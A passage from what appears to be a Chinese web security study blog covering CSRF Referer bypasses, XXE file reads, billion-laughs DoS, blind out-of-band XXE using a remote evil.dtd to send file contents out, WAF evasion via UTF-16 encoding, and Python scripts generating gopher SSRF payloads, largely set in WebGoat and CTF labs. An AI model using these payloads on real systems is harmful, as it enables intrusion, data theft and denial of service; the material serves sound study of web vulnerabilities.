<p>在网站新建一个<a href="https://link.zhihu.com/?target=http://google.com">http://google.com</a>目录 把CSRF存放在<a href="https://link.zhihu.com/?target=http://google.com">http://google.com</a>目录,即可绕过</p>
</blockquote>
<h4 id="4-判断Referer是否含有某域名"><a href="#4-判断Referer是否含有某域名" class="headerlink" title="4.判断Referer是否含有某域名"></a>4.判断Referer是否含有某域名</h4><blockquote>
<p>判断了Referer开头是否以<a href="https://link.zhihu.com/?target=http://126.com">http://126.com</a>以及126子域名 不验证根域名为<a href="https://link.zhihu.com/?target=http://126.com">http://126.com</a> 那么我这里可以构造子域名<a href="https://link.zhihu.com/?target=http://x.126.com.xxx.com">http://x.126.com.xxx.com</a>作为蠕虫传播的载体服务器，即可绕过。</p>
</blockquote>
<h3 id="3）不同浏览器的区别"><a href="#3）不同浏览器的区别" class="headerlink" title="3）不同浏览器的区别"></a>3）不同浏览器的区别</h3><p> 在满足上述前后端条件后，浏览器在完成预检请求后会自动携带上Cookie字段，但是由于浏览器的内核特性不同，此时又出现了不同的情况</p>
<blockquote>
<p>  <code>Firefox</code>携带网站A的Cookie值发起POST请求<br>  <code>Edge</code>没有携带网站A的Cookie值发起POST请求<br>  <code>Chrome</code>没有携带网站A的Cookie值发起POST请求</p>
</blockquote>
<h2 id="四、xxe"><a href="#四、xxe" class="headerlink" title="四、xxe"></a>四、xxe</h2><blockquote>
<p><a href="https://www.jianshu.com/p/ec2888780308">推荐学习文章</a></p>
</blockquote>
<h3 id="必须在文档类型定义-DTD-中创建实体"><a href="#必须在文档类型定义-DTD-中创建实体" class="headerlink" title="必须在文档类型定义 (DTD) 中创建实体"></a>必须在文档类型定义 (DTD) 中创建实体</h3><p><a data-fancybox="gallery" data-src="/Web-study/image-20221015095141092.png"><img src="/Web-study/image-20221015095141092.png" alt="image-20221015095141092"></a></p>
<p>正如您所看到的，一旦 XML 文档被解析器处理，它将<code>js</code>用定义的常量<code>“Jo Smith”</code>替换定义的实体。如您所见，这有很多优点，因为您可以<code>js</code>在一个地方更改为例如<code>“John Smith”</code>。</p>
<p>在 <code>Java</code> 应用程序中，<code>XML</code> 可用于从客户端获取数据到服务器，我们都熟悉 <code>JSON api</code>，我们也可以使用 <code>xml</code> 来获取信息。大多数情况下，框架会根据 <code>xml</code> 结构自动填充 <code>Java</code> 对象，例如：</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20221015095555062.png"><img src="/Web-study/image-20221015095555062.png" alt="image-20221015095555062"></a></p>
<blockquote>
<p>PCDATA:<br>它是XML解析器解析的文本数据使用的一个术语。XML 文档中的文本通常解析为字符数据，或者（按照文档类型定义术语）称为 PCDATA。</p>
<p>XML 的特殊字符（&amp;、&lt; 和 &gt;）在 PCDATA 中可以识别，并用于解析元素名称和实体。PCDATA（字符数据）区域被解析器视为数据块，从而允许您在数据流中包含任意字符。</p>
</blockquote>
<p>如果 XML 解析器配置为<strong>允许外部 DTD 或实体</strong>，我们可以使用以下内容更改以下 XML 片段：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">author</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">js</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;js;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>现在会发生什么？我们从本地文件系统中定义了一个包含，<code>XML</code> 解析器将加载该文件，并将在引用实体的任何位置添加内容。假设 XML 消息返回给用户，消息将是：</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20221015094930498.png"><img src="/Web-study/image-20221015094930498.png" alt="image-20221015094930498"></a></p>
<hr>
<h3 id="XXE-DOS攻击"><a href="#XXE-DOS攻击" class="headerlink" title="XXE DOS攻击"></a>XXE DOS攻击</h3><p>同XXE攻击我们可以执行一个DOS服务攻击对服务器。 一个例子的攻击是： </p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="params">&lt;?xml version=&quot;<span class="number">1.0</span>&quot;?&gt;</span></span><br><span class="line"><span class="params">&lt;!DOCTYPE lolz [</span></span><br><span class="line"><span class="params"> &lt;!ENTITY lol &quot;lol&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ELEMENT lolz (#PCDATA)&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol1 &quot;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol2 &quot;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol3 &quot;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol4 &quot;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol5 &quot;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol6 &quot;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol7 &quot;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol8 &quot;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol9 &quot;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;&quot;&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="params">&lt;lolz&gt;</span><span class="variable">&amp;lol9</span><span class="punctuation">;</span><span class="params">&lt;/lolz&gt;</span></span><br></pre></td></tr></table></figure>

<p>当<code>XML  parser</code>载这个文件，它认为，它包括一个根本的元素，”<code>lolz</code>“，包含的文本”<code>&amp;lol9</code>;”.  然而，”<code>&amp;lol9</code>;”是一个已定义的实体，扩展为一个包含十个”&lol8;”串。  每个”<code>&amp;lol8</code>;”串是一个已定义的实体，扩展到十”<code>&amp;lol7</code>;”串，等等。  </p>
<p>在所有的实体扩张，已经进行处理，<strong>这一小型(&lt;1KB)的框XML实际上会采取了几乎3千兆字节的存储器。</strong> </p>
<h3 id="盲注XXE"><a href="#盲注XXE" class="headerlink" title="盲注XXE"></a>盲注XXE</h3><p>在许多情况下，攻击者可以将 <code>XXE</code> <code>payload</code>发送到 <code>Web</code> 应用程序，但<strong>永远不会返回响应</strong>，这被称为带外漏洞（<code>Out-of-band</code>）</p>
<p>利用此类漏洞的过程需要利用参数实体，使攻击者让 <code>XML</code> 解析器向攻击者</p>
<p><strong>控制的服务器发出额外的请求，以便读取文件的内容</strong></p>
<p>作为一个攻击者你有<code>WebWolf</code>在你的控制( <strong>这可以是任何服务器你的控制之下.</strong> ), 例如，可以使用这个服务器平使用  <code>http://127.0.0.1:9090/home</code></p>
<p>我们如何使用这些终端检验我们是否可以执行<code>XXE</code>? </p>
<p>我们可以再次使用WebWolf举办一个文件叫  <code>attack.dtd</code> 创建这一文件与以下内容： </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">ping</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;&lt;a href=&quot;http://127.0.0.1:9090/landing&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;a href=&quot;http://127.0.0.1:9090/landing&quot; class=&quot;bare&quot;&gt;http://127.0.0.1:9090/landing&lt;/a&gt;&lt;/a&gt;&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>现在提交形式的改变使用<code>xml</code>： </p>
<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;webWolfLink:[webWolfLink]&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">%remote;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">text</span>&gt;</span>test<span class="symbol">&amp;ping;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>现在<code>WebWolf</code>浏览’进入的<code>请求</code>，你会看到： </p>
<figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;method&quot;</span> : <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">  <span class="string">&quot;path&quot;</span> : <span class="string">&quot;/landing&quot;</span>,</span><br><span class="line">  <span class="string">&quot;headers&quot;</span> : &#123;</span><br><span class="line">    <span class="string">&quot;request&quot;</span> : &#123;</span><br><span class="line">      <span class="string">&quot;user-agent&quot;</span> : <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;parameters&quot;</span> : &#123;</span><br><span class="line">    <span class="string">&quot;test&quot;</span> : [ <span class="string">&quot;HelloWorld&quot;</span> ],</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;timeTaken&quot;</span> : <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，通过<code>XXE</code>能够连接我们自己的服务器，这意味着<code>XXE</code>注入是可能的。 因此，通过<code>XXE</code>注入我们基本上能够达到，<code>curl</code>命令的相同的效果 </p>
<h4 id="引用远程服务器上的DTD"><a href="#引用远程服务器上的DTD" class="headerlink" title="引用远程服务器上的DTD"></a>引用远程服务器上的DTD</h4><p>另一种方式<code>% 变量</code>(有空格)，该方式只能在DTD中进行变量引用<code>%变量</code>，而不能在XML中引用。</p>
<p>改为引用远程服务器上的DTD(<code>evil.dtd</code>)</p>
<p>如果在响应包中<strong>无回显又想要读取敏感文件</strong>时，可以通过<code>OOB</code>带外注入的方法<strong>通过外带数据通道来提取数据</strong>，构造<code>payload</code>如下 ：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">GVI</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">body</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///tmp/test.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">//攻击者远程部署evil.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">write</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost:9090/landing?text=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="XXE-介绍与绕过"><a href="#XXE-介绍与绕过" class="headerlink" title="XXE 介绍与绕过"></a>XXE 介绍与绕过</h3><p>一个 <code>xml</code> 文档不仅可以用 <code>UTF-8</code> 编码，也可以用 <code>UTF-16(两个变体 - BE 和 LE)、UTF-32(四个变体 - BE、LE、2143、3412)</code> 和 <code>EBCDIC</code> 编码。 </p>
<p>在这种编码的帮助下，使用<code>正则表达式可以很容易地绕过 WAF</code>，因为在这种类型的 WAF 中，正则表达式<code>通常仅配置为单字符集</code>。 <code>外来编码也可用于绕过成熟的 WAF</code>，因为它们并不总是能够处理上面列出的所有编码。</p>
<p>例如，<code>libxml2</code> 解析器只支持一种类型的 <code>utf-32 - utf-32BE</code>，特别是不支持 <code>BOM</code>。</p>
<blockquote>
<p>一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。</p>
<p>在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。</p>
</blockquote>
<p>在<code>linux</code>使用<code>iconv</code>转编码</p>
<p><code>1.xml</code>的内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">users</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>alice<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd1<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>alice@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">group</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span> Bob<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>转<code>编码</code>为<code>UTF-16BE</code></p>
<p>linux下执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iconv 1.xml -f UTF-8 -t UTF-16BE -o 2.xml</span><br></pre></td></tr></table></figure>

<h2 id="五、ssrf"><a href="#五、ssrf" class="headerlink" title="五、ssrf"></a>五、ssrf</h2><h3 id="不当函数利用"><a href="#不当函数利用" class="headerlink" title="不当函数利用"></a>不当函数利用</h3><blockquote>
<p>PHP中下面函数的使用不当会导致SSRF:<br>&#96;&#96;file_get_contents()<code> </code>fsockopen()<code> </code>curl_exec()&#96;   </p>
</blockquote>
<h4 id="file-get-content"><a href="#file-get-content" class="headerlink" title="file_get_content"></a>file_get_content</h4><blockquote>
<p><code>file_get_content()</code>函数是用于将文件的内容读入到一个字符串中的首选方法，逻辑和前面一样。它支持读取远程文件或者本地文件，也支持多种协议。更多的，它还支持php伪协议，我们可以利用伪协议方法读取本地源码</p>
</blockquote>
<h4 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec"></a>curl_exec</h4><blockquote>
<p>通过<code>curl_exec()</code>函数执行url传过来参数给的地址，然后将参数返回前端。如果url参数被替换成<a href="http://xxxx或者curl支持的其他协议等都会被curl执行(curl支持`telnet/">http://xxxx或者curl支持的其他协议等都会被curl执行（curl支持`telnet</a> ftp ftps dict file ldap&#96;等）</p>
</blockquote>
<h3 id="gopher协议总结"><a href="#gopher协议总结" class="headerlink" title="gopher协议总结"></a>gopher协议总结</h3><blockquote>
<p><a href="https://blog.csdn.net/unexpectedthing/article/details/121667791">原文</a></p>
<p><a href="https://blog.csdn.net/qq_60115503/article/details/124407499">另一篇推荐的文章</a></p>
</blockquote>
<blockquote>
<p>gopher协议</p>
<p>是一种信息查0找系统，他将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求。这拓宽了 SSRF 的攻击面</p>
</blockquote>
<h4 id="1-利用："><a href="#1-利用：" class="headerlink" title="1)利用："></a>1)利用：</h4><blockquote>
<p>攻击内网的 <code>Redis、Mysql、FastCGI、Ftp</code>等等，也可以发送 <code>GET、POST</code> 请求</p>
</blockquote>
<p>gopher协议的格式：</p>
<blockquote>
<p><code>gopher://IP:port/_TCP/IP数据流</code>  </p>
<p>比如，</p>
<p><code>gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1</code></p>
</blockquote>
<blockquote>
<p>有时候读取文件需要从网站<code>本身的127.0.0.1发出请求</code></p>
<p>可以利用<code>file://</code>伪协议用于读取本地文件</p>
<p>比如<br><code>?url=file:///var/www/html/flag.php</code></p>
</blockquote>
<h4 id="2-GTE请求"><a href="#2-GTE请求" class="headerlink" title="2)GTE请求"></a>2)GTE请求</h4><blockquote>
<p>构造HTTP数据包</p>
<p>URL编码、替换回车换行为%0d%0a，HTTP包最后加%0d%0a代表消息结束</p>
<p>发送gopher协议, 协议后的IP一定要接端口</p>
</blockquote>
<h4 id="3-POST请求"><a href="#3-POST请求" class="headerlink" title="3)POST请求"></a>3)POST请求</h4><blockquote>
<p>POST与GET传参的区别：它有4个参数为必要参数</p>
<p>需要传递<br>Content-Type,<br>Content-Length,<br>host,<br>post的参数</p>
<p>比如：</p>
</blockquote>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">POST</span> /flag.php HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">127.0.0.1:80</span></span><br><span class="line"><span class="attribute">Content</span>-Length: <span class="number">36</span></span><br><span class="line"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">key</span>=<span class="number">51457</span>bb0a50c1eb2c92dcc3ec3c2cc13        //post参数</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>Host</code>、<code>Content-Type</code>和<code>Content-Length</code>请求头是必不可少的，但在 GET请求中可以没有<br><code>切记：Content-Length 这个要和底下POST参数[比如例子中key=,4个+51457bb0a50c1eb2c92dcc3ec3c2cc13,32个，共计36个]长度一致</code></p>
</blockquote>
<p>python脚本生成payload（POST和GTE请求都适用）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 36</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">key=a68a3b03e80ce7fef96007dfa01dc077</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(payload) <span class="comment">#对payload中的特殊字符进行编码</span></span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>) <span class="comment">#CRLFL漏洞</span></span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)<span class="comment"># 对新增的部分继续编码</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h5 id="构造一个提交文件的POST请求"><a href="#构造一个提交文件的POST请求" class="headerlink" title="构造一个提交文件的POST请求"></a>构造一个提交文件的POST请求</h5><p>首先抓取一个正常提交文件的数据包，然后使用上述脚本将其转换为gopher协议的格式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = \</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 293</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Origin: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Referer: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080/?url=http://127.0.0.1/flag.php</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">hello world!</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">submit</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or--</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="gopher打FastCGI"><a href="#gopher打FastCGI" class="headerlink" title="gopher打FastCGI"></a>gopher打FastCGI</h4><blockquote>
<p><a href="https://blog.csdn.net/unexpectedthing/article/details/121643002">看我这一篇</a></p>
</blockquote>
<h4 id="gopher打redis"><a href="#gopher打redis" class="headerlink" title="gopher打redis"></a>gopher打redis</h4><blockquote>
<p><a href="https://blog.csdn.net/unexpectedthing/article/details/121667613">看我这一篇</a></p>
</blockquote>
<h4 id="gopher打mysql"><a href="#gopher打mysql" class="headerlink" title="gopher打mysql"></a>gopher打mysql</h4><p><code>gopher</code>打<code>mysql</code>，就是利用<code>gopher</code>协议传<code>shell</code>到<code>mysql</code>中。</p>
<p>首先Mysql存在三种连接方式</p>
<blockquote>
<p>Unix套接字；<br>内存共享&#x2F;命名管道；<br>TCP&#x2F;IP套接字；</p>
</blockquote>
<p><code>MySQL</code>客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。</p>
<blockquote>
<p>当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证<br>当无需密码认证时直接发送TCP&#x2F;IP数据包即可</p>
</blockquote>
<p>这儿对<code>localhost</code>和127.0.0.1做一个区别</p>
<blockquote>
<p><code>localhost</code>也叫local ，正确的解释是：<code>本地服务器。</code><br><code>127.0.0.1</code>的正确解释是：<code>本机地址（本机服务器）</code>，它的解析通过本机的host文件，<code>windows自动将localhost解析为127.0.0.</code>1。</p>
<p><code>localhost（local）</code>是<code>不经网卡传输的，这点很重要，它不受网络防火墙和网卡相关的的限制</code>。</p>
<p><code>127.0.0.1</code>是通过<code>网卡传输，依赖网卡，并受到网络防火墙和网卡相关的限制</code></p>
<p>简单说<br>当我们通过<code>mysql -hlocalhost -uname</code>去连接的时候，**<code>没有经过网卡</code>**，使用的是<code>unix</code>套接字连接，这种时候我们<code>tcpdump</code>是抓不到包的<br>当我们需要抓取<code>mysql</code>通信数据包时<code>必须使用TCP/IP</code>套接字连接。<br><code>mysql -h 127.0.0.1 -uname</code></p>
</blockquote>
<p>我们平常打<code>mysql</code>最常用的就是打<strong>无密码</strong>的<code>mysql</code></p>
<p>但是我们在用<code>gopher</code>还是需要用<code>dict</code>协议去得到<code>mysql</code>的端口(默认是**<code>3306</code>**)</p>
<p>直接使用的<code>gopherus</code>工具,直接快速生成<code>payload</code></p>
